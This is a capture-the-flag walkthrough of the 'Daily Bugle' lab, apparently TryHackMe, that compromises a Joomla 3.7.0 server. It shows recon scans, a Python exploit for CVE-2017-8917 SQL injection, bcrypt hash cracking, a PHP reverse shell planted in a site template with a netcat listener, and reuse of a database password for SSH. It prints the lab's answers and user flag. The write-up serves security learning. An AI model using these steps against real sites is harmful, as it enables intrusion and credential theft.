# Daily Bugle
Compromise a Joomla CMS account via SQLi, practise cracking hashes and escalate your privileges by taking advantage of yum.

Its worth checking NMAP with anyweb site first to see what to expect
```
┌──(hacktopuser㉿hacktop)-[/mnt/VBoxShare/CTF/DailyBugle]
└─$ nmap -sV -sC 10.49.166.149 
Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-06 03:25 +1000
Nmap scan report for 10.49.166.149
Host is up (0.45s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 68:ed:7b:19:7f:ed:14:e6:18:98:6d:c5:88:30:aa:e9 (RSA)
|   256 5c:d6:82:da:b2:19:e3:37:99:fb:96:82:08:70:ee:9d (ECDSA)
|_  256 d2:a9:75:cf:2f:1e:f5:44:4f:0b:13:c2:0f:d7:37:cc (ED25519)
80/tcp   open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.6.40)
| http-robots.txt: 15 disallowed entries 
| /joomla/administrator/ /administrator/ /bin/ /cache/ 
| /cli/ /components/ /includes/ /installation/ /language/ 
|_/layouts/ /libraries/ /logs/ /modules/ /plugins/ /tmp/
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.6.40
|_http-title: Home
|_http-generator: Joomla! - Open Source Content Management
3306/tcp open  mysql   MariaDB 10.3.23 or earlier (unauthorized)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 31.14 seconds
```
3 services of interest MySQL, SSH and CMS Joomla on Appache, possibly a CentOS Operating system.
-O flag was included before but did not show anything conclusive with several lines of (no benefit):
OS:SCAN(V=7.99%E=4%D=5/6%OT=22%CT=1%CU=31662%PV=Y%DS=3%DC=I%G=Y%TM=69FA26FD....

# Task 1 Deploy
## Q1 view the IP in browser, who robbed the bank.
Answer: spiderman

# Task 2 Obtain user and root
## Q1 What is the Joomla version?
Quick view of source code of first page shows presents of joomla, but no version identification:
```
<meta name="generator" content="Joomla! - Open Source Content Management" />
```
The most obvious thing was to try joomla scan install via apt install did not work but here is one liner for installation:
```
sudo apt update && sudo apt install git perl libwww-perl liblwp-protocol-https-perl -y && git clone https://github.com/OWASP/joomscan.git
```
to run:
```
cd joomscan
perl joomscan.pl -u http://TARGET
    ____  _____  _____  __  __  ___   ___    __    _  _ 
   (_  _)(  _  )(  _  )(  \/  )/ __) / __)  /__\  ( \( )
  .-_)(   )(_)(  )(_)(  )    ( \__ \( (__  /(__)\  )  ( 
  \____) (_____)(_____)(_/\/\_)(___/ \___)(__)(__)(_)\_)
			(1337.today)
...
Processing http://<targetIP> ...

[+] FireWall Detector
[++] Firewall not detected

[+] Detecting Joomla Version
[++] Joomla 3.7.0
...
```
Feroxbuster might be best option to find the files and folder structure then scan if you know the name. But starting with Gobuster found the readme.txt without deep structure search, leading to version 3.4, but there were 5 sub-versions that year.

Quick gobuster search: 
```
gobuster dir -u http://10.49.157.59/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 64  -x php,txt,html,js,css
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.49.157.59/
[+] Method:                  GET
[+] Threads:                 64
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,txt,html,js,css
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 207]
/media                (Status: 301) [Size: 234] [--> http://10.49.157.59/media/]
/templates            (Status: 301) [Size: 238] [--> http://10.49.157.59/templates/]
/modules              (Status: 301) [Size: 236] [--> http://10.49.157.59/modules/]
/images               (Status: 301) [Size: 235] [--> http://10.49.157.59/images/]
/bin                  (Status: 301) [Size: 232] [--> http://10.49.157.59/bin/]
/plugins              (Status: 301) [Size: 236] [--> http://10.49.157.59/plugins/]
/includes             (Status: 301) [Size: 237] [--> http://10.49.157.59/includes/]
/language             (Status: 301) [Size: 237] [--> http://10.49.157.59/language/]
/README.txt           (Status: 200) [Size: 4494]
/components           (Status: 301) [Size: 239] [--> http://10.49.157.59/components/]
/cache                (Status: 301) [Size: 234] [--> http://10.49.157.59/cache/]
/libraries            (Status: 301) [Size: 238] [--> http://10.49.157.59/libraries/]
/robots.txt           (Status: 200) [Size: 836]
/index.php            (Status: 200) [Size: 9278]
/tmp                  (Status: 301) [Size: 232] [--> http://10.49.157.59/tmp/]
/LICENSE.txt          (Status: 200) [Size: 18092]
/layouts              (Status: 301) [Size: 236] [--> http://10.49.157.59/layouts/]
/administrator        (Status: 301) [Size: 242] [--> http://10.49.157.59/administrator/]
/configuration.php    (Status: 200) [Size: 0]
/htaccess.txt         (Status: 200) [Size: 3005]
/cli                  (Status: 301) [Size: 232] [--> http://10.49.157.59/cli/]
Progress: 1309650 / 1309656 (100.00%)
===============================================================
Finished

```
Two interesting ones here are the README.txt offering information on joomla and the administrator directory that leads to loading the administrator portal. Not useful at this point without credentials that work, not jonah, likely something obvious admin or administrator user but we'll get to that later.

curl README.txt shows version 3.7
templateDetails.xml can help but it only points to joomla 2.5 with extensions 3.1.0.
```
Joomla! 3.7 version history - https://docs.joomla.org/Joomla_3.7_version_history
```
If joomla structure known a more direct path was:
curl TargetIP/administrator/language/en-GB/en-GB.xml | grep "3.7"
```
<version>3.7.0</version>
```
Answer Q1: 3.7.0

## Q2: What is Jonah's cracked password?
Try hackme module states *Instead of using SQLMap, why not use a python script!*.
This means we can rule out search sploitsploit exploit found in 42033.txt which is just a SQLMAP script. But it clearly states CVE-2017-8917 as the vulnerability as does a simple search in google for this version 3.7.0. A github respository at https://github.com/teranpeterson/Joomblah has a python script for this CVE. 

Link to python script 
wget https://raw.githubusercontent.com/stefanlucas/Exploit-Joomla/master/joomblah.py

```
python joomblah.py <TargetIP>

 [-] Fetching CSRF token
 [-] Testing SQLi
  -  Found table: fb9j5_users
  -  Extracting users from fb9j5_users
 [$] Found user [u'811', u'Super User', u'jonah', u'jonah@tryhackme.com', u'$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm', u'', u'']
  -  Extracting sessions from fb9j5_session
```
This gives us Super User: jonah and hash: $2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm
```
$ echo "$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm" > hash.txt

$ john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Press 'q' or Ctrl-C to abort, almost any other key for status
spiderman123     (?)     
1g 0:00:27:38 DONE (2026-05-06 04:59) 0.000603g/s 28.24p/s 28.24c/s 28.24C/s spiderman123..speciala
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```
Answer Q2: spiderman123 
This password gets us into the <TargetIP>/administrator portal and the log into the website as Super User.

### Q3 What is the user flag?
This time we need to use credentials to get closer to finding the user flag. 
- First off we know its useful for website login and administrator portal. 
- Tried with ssh without success using jonah as user.

First log into Administrator portal after looking around 
- Extensions menu > Templates > Templates > Beez3
	- The index.php page when beez3 template is accessed will be called.
 	- Insert a reverse shell in for PHP from revshells.com	
 	- Either PHP PentestMonkey or PHP Ivan Sincek should work here
  	- Be sure the set up a netcat listener to connect to the server.
  	- Then call using wget or curl to the beez3 site to run the reverseshell.
```
curl http://THM_Target/templates/beez3.index.php
```
The reverse shell shows:
```
$ nc -lnvp 4444
listening on [any] 4444 ...
connect to [192.168.159.255] from (UNKNOWN) [10.48.153.42] 38934
Linux dailybugle 3.10.0-1062.el7.x86_64 #1 SMP Wed Aug 7 18:08:02 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
 13:36:53 up  1:28,  0 users,  load average: 0.00, 0.01, 0.05
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=48(apache) gid=48(apache) groups=48(apache)
sh: no job control in this shell
```

search for home directory and user, but cant access with apache user privileges:
```
sh-4.2$ cd /home
sh-4.2$ ls
jjameson
sh-4.2$ cd jjameson
sh: cd: jjameson: Permission denied. 
```

Apache is the current user based on fortunately it tells us on connection, entering 'whoami' drops the shell connection.
Apache user has full access to /var/www/html so a closer look is required.
```
sh-4.2$ cd /var/www/html
cd /var/www/html
sh-4.2$ ls
LICENSE.txt
README.txt
administrator
...
configuration.php
htaccess.txt
...
index.php
language
...
robots.txt
templates
...
```

A closer look at the configuration.php file:
```
the configuration.php file is interesting and contains a few lines that are clearly interesting:
public $dbtype = 'mysqli';
public $host = 'localhost';
public $user = 'root';
public $password = 'nv5uz9r3ZEDzVjNu';
public $db = 'joomla';
public $dbprefix = 'fb9j5_';
public $live_site = '';
public $secret = 'UAMBRWzHO3oFPmVC';
```      
Looks like might help find access to mysql using this password.
```
sh-4.2$ cat configuration.php
cat configuration.php
<?php
class JConfig {
        public $offline = '0';
        public $offline_message = 'This site is down for maintenance.<br />Please check back again soon.';
        public $display_offline_message = '1';
        public $offline_image = '';
        public $sitename = 'The Daily Bugle';
        public $editor = 'tinymce';
        public $captcha = '0';
        public $list_limit = '20';
        public $access = '1';
        public $debug = '0';
        public $debug_lang = '0';
        public $dbtype = 'mysqli';
        public $host = 'localhost';
        public $user = 'root';
        public $password = 'nv5uz9r3ZEDzVjNu';
        public $db = 'joomla';
        public $dbprefix = 'fb9j5_';
        public $live_site = '';
        public $secret = 'UAMBRWzHO3oFPmVC';
        public $gzip = '0';
        public $error_reporting = 'default';
        public $helpurl = 'https://help.joomla.org/proxy/index.php?keyref=Help{major}{minor}:{keyref}';
        public $ftp_host = '127.0.0.1';
        public $ftp_port = '21';
        public $ftp_user = '';
        public $ftp_pass = '';
        public $ftp_root = '';
        public $ftp_enable = '0';
        public $offset = 'UTC';
        public $mailonline = '1';
        public $mailer = 'mail';
        public $mailfrom = 'jonah@tryhackme.com';
        public $fromname = 'The Daily Bugle';
        public $sendmail = '/usr/sbin/sendmail';
        public $smtpauth = '0';
        public $smtpuser = '';
        public $smtppass = '';
        public $smtphost = 'localhost';
        public $smtpsecure = 'none';
        public $smtpport = '25';
        public $caching = '0';
        public $cache_handler = 'file';
        public $cachetime = '15';
        public $cache_platformprefix = '0';
        public $MetaDesc = 'New York City tabloid newspaper';
        public $MetaKeys = '';
        public $MetaTitle = '1';
        public $MetaAuthor = '1';
        public $MetaVersion = '0';
        public $robots = '';
        public $sef = '1';
        public $sef_rewrite = '0';
        public $sef_suffix = '0';
        public $unicodeslugs = '0';
        public $feed_limit = '10';
        public $feed_email = 'none';
        public $log_path = '/var/www/html/administrator/logs';
        public $tmp_path = '/var/www/html/tmp';
        public $lifetime = '15';
        public $session_handler = 'database';
        public $shared_session = '0';
}sh-4.2$ 
```
User.txt file is now accessible using hte password except not for user root, the user jjameson:
```
ssh jjameson@10.48.153.42
...
[jjameson@dailybugle ~]$ pwd
/home/jjameson
[jjameson@dailybugle ~]$ ls
user.txt
[jjameson@dailybugle ~]$ cat user.txt
27a260fe3cba712cfdedb1c86d80442e
```
